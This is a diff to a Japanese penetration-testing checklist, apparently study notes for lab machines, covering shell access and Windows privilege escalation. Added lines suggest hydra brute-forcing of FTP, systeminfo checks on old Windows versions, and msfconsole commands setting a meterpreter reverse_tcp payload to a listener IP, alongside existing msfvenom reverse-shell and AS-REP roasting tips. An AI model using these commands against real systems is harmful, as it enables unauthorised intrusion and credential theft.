@@ -23,6 +23,8 @@ version
 ```
 13. ncでシェルを取るとき、Outboundの宛先ポートは、ターゲットが許可しそうなポートか。盲目的に4444等をすると、コマンド実行はできてるのにシェルを取れない謎現象で詰まる。ターゲットをnmapしたときにopenなポートを使ってncで待ち受けとくとシェルを取れる確率が上がる。
 
+14. ftp系を見つけたら、hydraで認証情報のブルートフォースができないか。
+
 ## 権限昇格
 1. sudo -lで、パスワードなしでroot権限実行できるコマンドは無いか
 2. idコマンドで、現在ログイン中のユーザはどこのグループに属しているか
@@ -43,7 +45,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.13.58.5 LPORT=4444 -f exe-ser
 
 ```
 
-11. SeImpersonatePrivilegeの権限が有効になっていないか
+11. SeImpersonatePrivilegeの権限が有効になっていないか。ただしenabledになっていても、CLSIDsが検索して見つからなければ権限昇格は失敗する可能性が高い。
 12. 自分がアクセスできるユーザが、SIDをコンバートしたときに、ドメイン内でGenericAllのような強力なユーザを持っていないか
 13. ドメイン共有内の古いポリシーファイルの.xmlファイルに、GPP(Group Policy Preference)のパスワードがないか
 14. Kerberos preauthenticationが無効になっているアカウントがドメイン内にないか。それがあれば、Rubeusやimpacket-GetNPUsersを使ってAS-REP Roasting攻撃を使ってユーザのパスワードをクラックできる可能性がある。
@@ -107,6 +109,24 @@ wmic product get name,version,vendor
 
 26. SeManageVolumePrivilege権限が有効になっていないか。  
 [参考](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----b95d3146cfe9--------------------------------)
+
+27. OSのバージョンがWindows Server 2008など古い場合、OSそのものの既知の脆弱性を調べて権限昇格ができる脆弱性が無いか。  
+以下のコマンドをプロンプトから入力して、正確なOSのバージョンやパッチ適用状況を調べることができる。
+```
+systeminfo
+```
+
+28. Windows系のRCEでシェル取るときはrlwrap nc -lvnpだと安定しないことがあり、dir等のコマンドを実行しても応答が返ってこないことがある。なのでLinuxでもそうだが特にWindowsへの攻撃では、msfconsoleからset payloadを使うとよい。
+```
+# コンソール立ち上げ、スプラッシュなし
+msfconsole -q
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.45.241
+set lport 445
+run
+```
+
+29. "Program Files"系のフォルダ内に、Windowsデフォルトではない見慣れないファイルやフォルダが無いか。
 
 ===========
 
